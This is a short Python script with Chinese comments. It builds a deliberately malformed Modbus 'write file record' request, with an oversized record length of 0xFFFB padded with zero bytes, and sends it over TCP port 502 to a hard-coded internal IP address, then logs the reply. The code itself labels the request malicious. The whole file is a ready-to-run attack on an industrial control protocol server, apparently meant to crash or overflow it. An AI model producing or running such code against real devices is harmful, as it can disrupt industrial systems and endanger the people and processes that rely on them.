import socket
from scapy.all import *
from scapy.contrib.modbus import *
import logging

logging.basicConfig(level=logging.DEBUG)

def send_malicious_modbus_request():
    try:
        # 手動構建寫文件記錄的數據
        reference_type = 6
        file_number = 0
        record_number = 0
        record_length = 0xFFFB
        record_data = b'\x00' * record_length

        # 組合成完整的Modbus PDU
        modbus_pdu = struct.pack('!BBHHH', reference_type, file_number, record_number, record_length, len(record_data)) + record_data

        # 構建Modbus ADU請求
        modbus_request = ModbusADURequest(transId=1, protoId=0, len=7 + len(modbus_pdu), unitId=1) / Raw(modbus_pdu)
        request_data = bytes(modbus_request)
        
        # 使用socket發送請求
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect(('10.103.152.8', 502))
            logging.info("Connected to server.")
            
            s.send(request_data)
            logging.debug('Sent malicious Modbus request: %s', repr(request_data))
            
            response = s.recv(1024)
            logging.debug('Received response: %s', repr(response))
            
            modbus_response = ModbusADUResponse(response)
            logging.info("Modbus response: %s", modbus_response.show(dump=True))
            
            logging.info("Connection closed.")
    except Exception as e:
        logging.error("Error in client communication: %s", e)

if __name__ == "__main__":
    send_malicious_modbus_request()
